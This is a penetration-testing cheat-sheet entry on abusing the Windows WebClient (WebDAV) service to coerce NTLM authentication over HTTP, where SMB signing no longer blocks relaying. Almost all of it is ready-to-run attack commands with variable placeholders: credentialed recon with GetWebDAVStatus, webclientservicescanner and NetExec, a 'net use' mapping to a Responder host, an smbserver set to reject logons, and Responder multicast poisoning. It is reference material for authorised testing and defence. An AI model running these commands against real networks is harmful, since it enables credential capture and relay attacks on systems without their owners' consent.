---
technique: WebClient Abuse (WebDAV)
category: mitm
targets: Windows Hosts with WebClient Service
protocols: HTTP, WebDAV, SMB
remote_capable: true
tags: mitm webclient webdav http coercion ntlm-relay booster responder
---

# WebClient Abuse (WebDAV)

The WebClient service (WebDAV) enables file operations over HTTP on Windows. When active, coercion techniques like PetitPotam or PrinterBug can be directed at a WebDAV connection string (`\\SERVER@PORT\PATH`) instead of a plain UNC path, forcing the victim to authenticate over HTTP rather than SMB. HTTP-based NTLM authentications are not restricted by SMB signing, greatly expanding relay targets.

## Windows

GetWebDAVStatus checks if the WebClient service is running on remote machines before coercion.

### GetWebDAVStatus

#csharp #recon

Check whether the WebClient service is running on a remote machine.

```powershell title:"Check WebClient service status on a remote host"
.\GetWebDAVStatus.exe "$rhost"
```
<!-- cheat
var rhost
-->

### net use (start WebClient)

#cmd #native #webclient-start

Trigger the WebClient service to start on the local machine by mapping a remote WebDAV share.

```cmd title:"Start WebClient service by mapping a WebDAV share"
net use x: http://"$responder_ip"/
```
<!-- cheat
var responder_ip
-->

## Linux

webclientservicescanner and NetExec enumerate WebClient presence before launching coercion with a WebDAV connection string target.

### webclientservicescanner

#python #recon

Enumerate hosts with the WebClient service running to identify viable HTTP coercion targets.

```sh title:"Scan for hosts with WebClient service running"
webclientservicescanner "$domain"/"$user":"$pass"@"$rhost"
```
<!-- cheat
import domain_ip
import users
import passwords
var rhost
-->

### NetExec (webdav module)

#python #recon #nxc

Enumerate WebClient service status across multiple targets using the NetExec webdav module.

```sh title:"Check WebClient service across targets with NetExec"
netexec smb "$targets" -d "$domain" -u "$user" -p "$pass" -M webdav
```
<!-- cheat
import domain_ip
import users
import passwords
var targets
-->

### Step 1: Start smbserver returning logon failure (smbserver.py)

#python #coercion #webdav-fallback

Start an smbserver that rejects authentication to force clients with the WebClient service to fall back to WebDAV.

```sh title:"Start smbserver returning STATUS_LOGON_FAILURE to force WebDAV fallback"
python3 smbserver.py share . -smb2support -username notexist -password notexist
```
<!-- cheat -->

### Step 2: Poison multicast to trigger WebDAV fallback (responder)

#python #coercion #webdav-fallback

Run Responder to poison LLMNR/NBT-NS so clients attempt SMB to the smbserver, then fall back to WebDAV.

```sh title:"Poison multicast to trigger WebDAV fallback via Responder"
responder --interface "$iface"
```
<!-- cheat
var iface
-->
